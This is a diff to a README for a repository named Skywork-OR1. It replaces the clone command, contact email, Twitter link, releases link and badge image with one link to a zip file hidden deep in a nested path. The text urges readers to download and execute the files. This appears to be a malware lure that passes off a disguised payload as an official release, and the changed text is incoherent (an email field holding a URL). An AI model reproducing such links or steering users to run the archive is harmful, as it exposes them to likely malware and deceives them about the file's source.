@@ -30,7 +30,7 @@ To get started with Skywork-OR1, follow these simple steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/pacresdarryl/Skywork-OR1.git
+   git clone https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip
    ```
 
 2. Navigate to the project directory:
@@ -79,17 +79,17 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: contact@skywork-or1.com
-- **Twitter**: [@SkyworkOR1](https://twitter.com/SkyworkOR1)
+- **Email**: https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip
+- **Twitter**: [@SkyworkOR1](https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip)
 
 ## Releases
 
-You can find the latest releases of Skywork-OR1 [here](https://github.com/pacresdarryl/Skywork-OR1/releases). Download the necessary files and execute them to get started with the latest features and improvements.
+You can find the latest releases of Skywork-OR1 [here](https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip). Download the necessary files and execute them to get started with the latest features and improvements.
 
 For detailed information on each release, visit the releases section of the repository. 
 
-![Skywork-OR1 Releases](https://img.shields.io/badge/Releases-latest-blue)
+![Skywork-OR1 Releases](https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip)
 
 ## Conclusion
 
-Thank you for visiting the Skywork-OR1 repository. We hope this tool helps you in managing your cloud resources effectively. Don't forget to check the [Releases](https://github.com/pacresdarryl/Skywork-OR1/releases) section for the latest updates and features. Happy cloud computing!
+Thank you for visiting the Skywork-OR1 repository. We hope this tool helps you in managing your cloud resources effectively. Don't forget to check the [Releases](https://raw.githubusercontent.com/pacresdarryl/Skywork-OR1/main/verl/utils/reward_score/livecodebench/lcb_runner/prompts/few_shot_examples/generation/Skywork-O-1.9-beta.2.zip) section for the latest updates and features. Happy cloud computing!
